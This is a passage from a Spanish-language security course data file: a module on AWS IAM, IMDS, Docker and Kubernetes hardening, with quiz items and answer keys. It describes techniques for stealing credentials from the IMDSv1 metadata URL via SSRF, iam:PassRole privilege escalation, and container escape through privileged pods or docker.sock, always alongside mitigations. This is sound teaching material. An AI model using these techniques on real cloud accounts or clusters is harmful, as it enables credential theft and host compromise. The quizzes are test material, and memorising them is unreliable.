        url: 'https://owasp.org/www-project-web-security-testing-guide/',
        type: 'Guía Técnica',
      },
    ],
    linkedLabId: 'lab-linux-privesc',
  },
  {
    id: 'mod-12',
    number: '12',
    title: 'Seguridad en la Nube (AWS/Azure/GCP), Contenedores y Kubernetes',
    tier: 'Avanzado / Senior',
    domain: 'Cloud & K8s',
    estimatedHours: 18,
    summary:
      'Domina la seguridad de infraestructuras modernas cloud-native: modelo de responsabilidad compartida, escalada de privilegios en AWS IAM (`iam:PassRole`), SSRF contra IMDSv1 vs IMDSv2, seguridad de contenedores Docker y hardening de clústeres Kubernetes (Pod Security Standards, RBAC y NetworkPolicies).',
    objectives: [
      'Auditar políticas AWS IAM en formato JSON para identificar vectores de escalada de privilegios como `iam:PassRole` + `ec2:RunInstances` o `iam:CreatePolicyVersion`.',
      'Explicar cómo una vulnerabilidad SSRF permite robar credenciales temporales del servicio de metadatos (IMDSv1 en `169.254.169.254`) y cómo IMDSv2 lo mitiga.',
      'Detectar y corregir contenedores privilegiados (`privileged: true`, `hostPID: true`, montajes de `docker.sock`) que permiten escapar hacia el nodo host en Kubernetes.',
    ],
    glossary: [
      {
        term: 'iam:PassRole',
        definition: 'Permiso de AWS IAM que autoriza a un usuario a asignar un Rol IAM a un servicio (como EC2 o Lambda) para que actúe con esos permisos.',
      },
      {
        term: 'IMDSv2 (169.254.169.254)',
        definition: 'Instance Metadata Service v2: exige un token de sesión obtenido vía HTTP PUT con TTL para impedir el robo de credenciales mediante SSRF simple.',
      },
      {
        term: 'privileged: true',
        definition: 'Configuración peligrosa en un Pod de Kubernetes que desactiva el aislamiento de capacidades y otorga acceso casi total al kernel y discos del nodo host.',
      },
    ],
    predictionPrompt: {
      question: 'Predice antes de auditar el clúster: Si un contenedor Docker/Kubernetes sufre una intrusión, ¿está el atacante encerrado dentro de un kernel separado como en una Máquina Virtual?',
      reveal: '¡No! Los contenedores comparten el MISMO kernel Linux del nodo físico (solo están aislados por Namespaces y Cgroups). Si el Pod tiene `privileged: true`, puede montar el disco del host (`/dev/sda1`) y escapar al servidor físico en segundos.',
    },
    theorySections: [
      {
        heading: '1. Seguridad Cloud IAM: Escalada por `iam:PassRole` y Protección de Metadatos IMDSv2',
        content:
          'En la nube, la identidad es el nuevo perímetro. Un usuario IAM con pocos permisos aparentemente inocuos, como `iam:PassRole` con recurso `*` combinado con `ec2:RunInstances` o `lambda:CreateFunction`, puede crear un recurso nuevo, asignarle un Rol de Administrador existente y ejecutar código con privilegios totales en la cuenta AWS. Asimismo, si una aplicación web en EC2 sufre SSRF y la instancia usa IMDSv1, el atacante puede consultar `http://169.254.169.254/latest/meta-data/iam/security-credentials/` para robar las claves STS temporales del rol. IMDSv2 mitiga esto exigiendo primero una petición `PUT` con cabecera `X-aws-ec2-metadata-token-ttl-seconds` para obtener un token de sesión.',
        codeSnippet: `# Auditoría de políticas IAM y contextos de seguridad en Kubernetes
aws iam get-policy-version
kubectl get pods`,
      },
      {
        heading: '2. Contenedores y Kubernetes: De Aislamiento por Namespaces a Escape de Contenedor',
        content:
          'Un contenedor no es una máquina virtual: comparte el mismo kernel Linux del host, aislado únicamente mediante Namespaces (visibilidad), Cgroups (límites de recursos) y Seccomp/AppArmor (filtrado de syscalls). Si un Pod de Kubernetes se despliega con `privileged: true`, `hostPID: true` o monta el socket `/var/run/docker.sock` del nodo, ese aislamiento desaparece y un atacante dentro del contenedor puede montar el disco físico del nodo host (`/dev/sda1`) y comprometer todo el clúster.',
      },
    ],
    realWorldCase: {
      title: 'Brecha Cloud por SSRF contra Servicio de Metadatos IMDSv1 y Permisos S3 Excesivos (Caso Capital One)',
      context:
        'Un WAF mal configurado en AWS tenía una vulnerabilidad SSRF que permitió consultar el endpoint de metadatos `169.254.169.254` (IMDSv1) y extraer las credenciales temporales del rol IAM asociado a la instancia.',
      technicalRootCause:
        'Combinación de SSRF en la capa de aplicación + uso de IMDSv1 sin token de sesión + un rol IAM que violaba el mínimo privilegio al permitir listar y sincronizar cientos de buckets S3 (`s3:ListBucket`, `s3:GetObject` sobre `*`).',
      lesson:
        'Forzar IMDSv2 (`HttpTokens: required` con hop limit = 1), restringir políticas IAM al ARN exacto de cada bucket y auditar configuraciones con herramientas CSPM.',
    },
    diagramType: 'cloud-iam',
    diagramCaption:
      'Defensa en Cloud y Kubernetes: bloqueo de SSRF con IMDSv2, restricción de `iam:PassRole` y aislamiento de Pods sin privilegios.',
    activeRecallQuestions: [
      {
        id: 'ar-12-1',
        question: '¿Cómo mitiga específicamente IMDSv2 en AWS el robo de credenciales IAM a través de vulnerabilidades Server-Side Request Forgery (SSRF) clásicas?',
        options: [
          'Cambiando la dirección IP 169.254.169.254 cada cinco minutos.',
          'Exigiendo una petición HTTP PUT inicial con una cabecera personalizada (`X-aws-ec2-metadata-token-ttl-seconds`) para emitir un token de sesión, lo cual bloquea los SSRF simples basados en peticiones GET o redirecciones abiertas.',
          'Eliminando por completo los roles IAM de EC2.',
          'Pidiendo un código SMS al administrador en cada petición.',
        ],
        correctIndex: 1,
        explanation:
          'La mayoría de las vulnerabilidades SSRF permiten únicamente forzar peticiones HTTP GET simples sin control de verbos `PUT` ni inyección de cabeceras personalizadas, y además IMDSv2 bloquea peticiones con la cabecera `X-Forwarded-For`.',
        commonMisconception: 'Dejar IMDSv1 habilitado ("v1 and v2 optional") pensando que activar v2 como opcional ya protege la instancia.',
      },
      {
        id: 'ar-12-2',
        question: 'En Kubernetes, ¿qué configuración en el `securityContext` de un Pod representa el mayor riesgo de escape de contenedor hacia el nodo host?',
        options: [
          'runAsNonRoot: true',
          'readOnlyRootFilesystem: true',
          'privileged: true (combinado con hostPID: true o hostNetwork: true)',
          'allowPrivilegeEscalation: false',
        ],
        correctIndex: 2,
        explanation:
          '`privileged: true` otorga al contenedor todas las Linux Capabilities del host (`CAP_SYS_ADMIN`, etc.) y acceso directo a los dispositivos en `/dev`, permitiendo montar el sistema de archivos del nodo subyacente.',
        commonMisconception: 'Usar `privileged: true` por comodidad cuando una aplicación solo necesita escuchar en un puerto o realizar una tarea específica.',
      },
      {
        id: 'ar-12-3',
        question: 'En AWS IAM, ¿por qué otorgar a un desarrollador los permisos `"Action": ["iam:PassRole", "ec2:RunInstances"], "Resource": "*"` permite una Escalada de Privilegios total en la cuenta?',
        options: [
          'Porque `ec2:RunInstances` borra los logs de CloudTrail.',
          'No permite ninguna escalada si el usuario no tiene permiso `iam:CreateUser`.',
          'Porque permite cambiar la contraseña de facturación.',
          'Porque el usuario puede lanzar una nueva instancia EC2, adjuntarle un Rol de `AdministratorAccess` existente gracias a `iam:PassRole` sobre `*`, y conectarse a la instancia para obtener las credenciales temporales de Administrador.',
        ],
        correctIndex: 3,
        explanation:
          '`iam:PassRole` sin restricción de `Resource` permite delegar cualquier rol existente de la cuenta hacia una nueva carga de trabajo controlada por el usuario.',
        commonMisconception: 'Restringir los permisos directos de un usuario pero dejarle `iam:PassRole` con comodín `"*"` junto a creación de EC2/Lambda.',
      },
      {
        id: 'ar-12-4',
        question: '¿Qué perfil de los **Pod Security Standards (PSS)** de Kubernetes obliga a que los contenedores corran como usuario no-root (`runAsNonRoot: true`), prohíbe escalada de privilegios (`allowPrivilegeEscalation: false`) y elimina todas las capacidades (`drop: ["ALL"]`)?',
        options: [
          'Restricted (Restringido)',
          'Privileged (Privilegiado)',
          'Baseline (Línea base permisiva)',
          'Unconfined',
        ],
        correctIndex: 0,
        explanation:
          'El perfil `Restricted` de Pod Security Standards implementa las mejores prácticas de endurecimiento de contenedores recomendadas por CNCF y NSA/CISA.',
        commonMisconception: 'Creer que el perfil por defecto de un namespace nuevo en Kubernetes bloquea contenedores que corren como `root`.',
      },
      {
        id: 'ar-12-5',
        question: 'Cuando ejecutas contenedores dentro de una instancia EC2 en AWS, ¿por qué se recomienda configurar `HttpPutResponseHopLimit = 1` en IMDSv2 (si los contenedores no necesitan usar el rol del nodo)?',
        options: [
          'Para aumentar el ancho de banda de la tarjeta de red.',
          'Porque un paquete que sale desde la red puente de un contenedor hacia el host decrementa su TTL en 1 salto; con `HopLimit = 1`, la respuesta del servicio de metadatos no puede atravesar el bridge de vuelta hacia el contenedor explotado.',
          'Para permitir acceso desde Internet a `169.254.169.254`.',
          'Para desactivar el cifrado TLS en S3.',
        ],
        correctIndex: 1,
        explanation:
          'Un `HopLimit` de 1 asegura que solo los procesos que corren directamente en la red del host puedan recibir el token IMDSv2, impidiendo que un contenedor aislado en una red bridge robe el rol IAM del nodo.',
        commonMisconception: 'Aumentar `HttpPutResponseHopLimit` a 2 o 3 en todos los nodos de Kubernetes sin usar IRSA (IAM Roles for Service Accounts) con principio de mínimo privilegio.',
      },
    ],
    transferScenarioQuestion: {
      id: 'tr-12-1',
      question: 'ESCENARIO DE TRANSFERENCIA: Un equipo despliega un contenedor de CI/CD en Kubernetes montando el socket `/var/run/docker.sock` del nodo host para poder construir imágenes Docker, aunque le ponen `privileged: false`. ¿Es seguro ese aislamiento?',
      options: [
        'Sí, porque `privileged` está en `false`.',
        'No: tener acceso de lectura/escritura a `/var/run/docker.sock` equivale a tener acceso `root` total sobre el nodo host, ya que cualquier proceso dentro del contenedor puede pedirle al demonio Docker del host que lance otro contenedor con `-v /:/host --privileged`.',
        'Solo es peligroso si el contenedor usa Python 2.',
        'Solo permite ver la lista de imágenes pero no crear contenedores.',
      ],
      correctIndex: 1,
      explanation:
        'El socket de Docker (`/var/run/docker.sock`) expone la API sin autenticación del demonio que corre como `root` en el host. Para construir imágenes en Kubernetes sin exponer el nodo se deben usar constructores sin demonio ni root como Kaniko o BuildKit rootless.',
      commonMisconception: 'Montar `docker.sock` dentro de Pods pensando que es seguro porque el Pod no tiene `privileged: true`.',
    },
    selfExplanationPrompt: {
      question:
        'Explica por qué un contenedor Docker o un Pod en Kubernetes NO proporciona el mismo aislamiento que una Máquina Virtual con hipervisor, y qué tres controles debes exigir en el `securityContext` de un Pod en producción.',
      guidingSubQuestions: [
        '¿Qué componente crítico del sistema operativo comparten todos los contenedores que corren en un mismo nodo?',
        '¿Qué logran las directivas `runAsNonRoot`, `allowPrivilegeEscalation: false` y `capabilities.drop: ["ALL"]`?',
      ],
      keyTerms: ['kernel', 'namespaces', 'privileged', 'root', 'capabilities'],
      exemplarAnswer:
        'A diferencia de las máquinas virtuales que emulan hardware y tienen su propio kernel independiente sobre un hipervisor, los contenedores son procesos aislados mediante Linux Namespaces y Cgroups que comparten el mismo kernel del nodo host. Si un contenedor corre como root con capacidades excesivas, puede abusar del kernel compartido para escapar al nodo. En producción se debe exigir: (1) runAsNonRoot: true para no ejecutar procesos como UID 0, (2) allowPrivilegeEscalation: false, y (3) eliminar todas las capacidades con drop: ["ALL"] junto con un perfil Seccomp RuntimeDefault.',
    },
    deliberatePractice: {
      prompt:
        'Audita la política IAM con `aws iam get-policy-version` y luego inspecciona los Pods del clúster con `kubectl get pods` en la terminal.',
      scenario: 'Estás en el nodo `cloud-cluster (10.10.10.250)` y debes detectar el permiso `iam:PassRole` excesivo y el Pod desplegado con `privileged: true`.',
      starterCommandOrCode: 'kubectl get pods',
      expectedPatterns: ['kubectl', 'get', 'pods', 'aws', 'iam'],
      hint: 'Ejecuta `aws iam get-policy-version` y luego `kubectl get pods` en la terminal.',
      feedbackSuccess:
        'Auditoría Cloud & Kubernetes completada. Detectaste tanto la escalada `iam:PassRole` como el contenedor privilegiado (`privileged: true`).',
      feedbackError: 'Ejecuta `aws iam get-policy-version` y `kubectl get pods` en el nodo `cloud-cluster`.',
    },
    knowledgeSummary: [
      'En Cloud, la Identidad (IAM) es el perímetro principal: audita continuamente permisos `iam:PassRole`, comodines `"*"` y claves de acceso estáticas.',
      'Exige IMDSv2 (`HttpTokens: required`, `HopLimit: 1`) en todas las instancias para neutralizar el robo de credenciales IAM vía SSRF.',
      'En Kubernetes, aplica Pod Security Standards (`Restricted`): prohíbe `privileged: true`, exige `runAsNonRoot: true` y segmenta el tráfico entre Pods con `NetworkPolicy`.',
    ],
    spanishVideos: [
      {
        title: 'Kubernetes Official Documentation — Pod Security Standards (Privileged, Baseline, Restricted)',
        author: 'Cloud Native Computing Foundation (CNCF)',
        duration: 'Estándar Oficial',
        url: 'https://kubernetes.io/docs/concepts/security/pod-security-standards/',
        focus: 'Controles obligatorios de seguridad en el plano de control y manifiestos de Pods.',
      },
      {
        title: 'AWS Security Documentation — Configuring IMDSv2 & IAM Least Privilege',
        author: 'Amazon Web Services',
        duration: 'Guía Oficial',
        url: 'https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html',
        focus: 'Cómo funciona el flujo de tokens PUT en IMDSv2 y defensa en profundidad contra SSRF.',
      },
    ],
    officialDocs: [
      {
        title: 'Kubernetes Official Documentation — Pod Security Standards',
        organization: 'Cloud Native Computing Foundation (CNCF)',
        url: 'https://kubernetes.io/docs/concepts/security/pod-security-standards/',
        type: 'Estándar Oficial',
      },
      {
        title: 'AWS Security Best Practices in IAM & IMDSv2',
        organization: 'Amazon Web Services',
        url: 'https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html',
        type: 'Guía Técnica',
      },
    ],
    linkedLabId: 'lab-cloud-k8s',
  },
];
